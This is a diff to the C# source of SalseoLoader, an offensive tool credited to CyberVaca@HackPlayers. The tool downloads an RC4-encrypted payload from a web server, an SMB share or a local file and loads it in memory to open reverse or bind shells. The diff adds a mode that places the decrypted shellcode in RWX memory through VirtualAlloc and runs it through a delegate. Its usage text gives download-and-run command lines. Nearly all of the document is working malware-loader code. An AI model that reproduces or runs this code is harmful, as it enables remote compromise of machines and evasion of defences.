@@ -23,9 +23,54 @@ namespace SalseoDecrypter
 
     class Program
     {
-	    
-    [DllImport("user32.dll")]
-    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [Flags]
+        public enum AllocationType : uint
+        {
+            COMMIT = 0x1000,
+            RESERVE = 0x2000,
+            RESET = 0x80000,
+            LARGE_PAGES = 0x20000000,
+            PHYSICAL = 0x400000,
+            TOP_DOWN = 0x100000,
+            WRITE_WATCH = 0x200000
+        }
+
+        [Flags]
+        public enum MemoryProtection : uint
+        {
+            EXECUTE = 0x10,
+            EXECUTE_READ = 0x20,
+            EXECUTE_READWRITE = 0x40,
+            EXECUTE_WRITECOPY = 0x80,
+            NOACCESS = 0x01,
+            READONLY = 0x02,
+            READWRITE = 0x04,
+            WRITECOPY = 0x08,
+            GUARD_Modifierflag = 0x100,
+            NOCACHE_Modifierflag = 0x200,
+            WRITECOMBINE_Modifierflag = 0x400
+        }
+
+        public enum FreeType : uint
+        {
+            MEM_DECOMMIT = 0x4000,
+            MEM_RELEASE = 0x8000
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32")]
+        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);
+
+        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
+        public delegate Int32 ExecuteDelegate();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
         static void main()
         {
@@ -74,8 +119,8 @@ namespace SalseoDecrypter
             Console.Write(banner);
             Console.ForegroundColor = ConsoleColor.White;
             Console.WriteLine("                             By: CyberVaca@HackPlayers");
-
-            if (args.Length <= 3)
+            
+            if (args.Length <= 2 )
             {
             	string ayuda = @"
 [+] Usage:
@@ -86,6 +131,7 @@ namespace SalseoDecrypter
     [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseDNS LHOST ServerDNS
     [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt BindTCP LHOST LPORT
     [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseSSL LHOST LPORT
+    [-] SalseoLoader.exe password http://webserver.com/shellcode.txt shellcode
     
 [+] Shells availables:
 
@@ -111,11 +157,11 @@ namespace SalseoDecrypter
             if (funcion == "reversetcp" || funcion == "reversessl" ) { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
             if (funcion == "reverseudp") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
             if (funcion == "reversedns") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un nombre de dominio :("); Environment.Exit(1); } }
-            if (funcion == "reverseicmp") { if (args.Length < 4) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
-            if (funcion != "reversetcp" & funcion != "reversedns" & funcion != "reverseicmp" & funcion != "reverseudp" & funcion != "bindtcp" & funcion != "reversessl") { Console.WriteLine("\n[-] Error en el tipo de shell :("); Environment.Exit(1); }
+            if (funcion == "reverseicmp") { if (args.Length < 4) { Environment.Exit(1); } }
+            if (funcion == "shellcode") { if (args.Length < 2) { Console.Write("aqui entra"); Environment.Exit(1); } }
+            if (funcion != "reversetcp" & funcion != "reversedns" & funcion != "reverseicmp" & funcion != "reverseudp" & funcion != "bindtcp" & funcion != "reversessl" & funcion != "shellcode") { Console.WriteLine("\n[-] Error en el tipo de shell :("); Environment.Exit(1); }
             Console.ForegroundColor = ConsoleColor.Gray;
-            if (args[1].ToString().Substring(0, 5).ToLower() == "http:") { Salseo_Encriptado = ClienteWeb.LeePayload(args[1].ToString()); }
-            //if (args[1].ToString().Substring(0, 5).ToLower() == "https") { Salseo_Encriptado = ClienteWebhttps.LeePayload(args[1].ToString()); }
+            if (args[1].ToString().Substring(0, 4).ToLower() == "http") { Salseo_Encriptado = ClienteWeb.LeePayload(args[1].ToString()); }
             if (args[1].ToString().Substring(0, 2).ToLower() == "\\\\") { Console.WriteLine("[+] Leyendo datos via SMB..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
             if (args[1].ToString().Substring(0, 4).ToLower() != "http" && args[1].ToString().Substring(0, 2).ToLower() != "\\\\") { Console.WriteLine("[+] Leyendo datos via LOCAL..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
             //#############################################################
@@ -126,18 +172,21 @@ namespace SalseoDecrypter
             byte[] Final_Payload_encriptado = StringHEXToByteArray.Convierte(hexadecimal);
             byte[] Final_Payload = RC4.Decrypt(xKey, Final_Payload_encriptado);
             string clases = null;
-            Console.WriteLine("[+] Desencriptando el salseo.");
-            Assembly salsongo = Assembly.Load(Final_Payload);
-            Console.WriteLine("[+] Cargando la salsa en memoria.");
-            Console.WriteLine("[+] Namespace de Assembly : " + salsongo.GetName().Name);
-            foreach (Type infoass in salsongo.GetTypes()) { var strclase = string.Format("{0}", infoass.Name); clases = strclase; };
-            //Console.WriteLine("[+] Class de Assembly : " + clases);
-            //######################## Foreach de los metodos ####################
-            //#####################################################################
-            Console.WriteLine("[+] Version: " + salsongo.GetName().Version.ToString());
-            Console.ForegroundColor = ConsoleColor.White;
-            //#############################################################
+            Assembly salsongo = null;
+            
+            if (funcion != "shellcode")
+            {
+                salsongo = Assembly.Load(Final_Payload);
+                Console.WriteLine("[+] Cargando la salsa en memoria.");
+                Console.WriteLine("[+] Namespace de Assembly : " + salsongo.GetName().Name);
+                foreach (Type infoass in salsongo.GetTypes()) { var strclase = string.Format("{0}", infoass.Name); clases = strclase; };
+                //######################## Foreach de los metodos ####################
+                //#####################################################################
+                Console.WriteLine("[+] Version: " + salsongo.GetName().Version.ToString());
+                Console.ForegroundColor = ConsoleColor.White;
+                //#############################################################
 
+            }
             //########################### LLamada a funcion Reversa ########################
             if (funcion == "reversetcp")
             {
@@ -198,7 +247,30 @@ namespace SalseoDecrypter
                 object myInstance = Activator.CreateInstance(myType);
                 Method.Invoke(myInstance, new object[] { argumentos });
             }
+            if (funcion == "shellcode")
+            {
+                byte[] sc = Final_Payload;
+                IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
+                System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: No se pudo asignar la memoria remota.");
+                Console.WriteLine("[+] Intentando cargar Shellcode");
 
+                try
+                {
+                    Marshal.Copy(sc, 0, baseAddr, sc.Length);
+                    ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));
+
+                    del();
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                }
+                finally
+                {
+                    VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
+                }
+            }
+        }
         }
     }
 
@@ -403,4 +475,4 @@ namespace SalseoDecrypter
 
 
 
-}
+
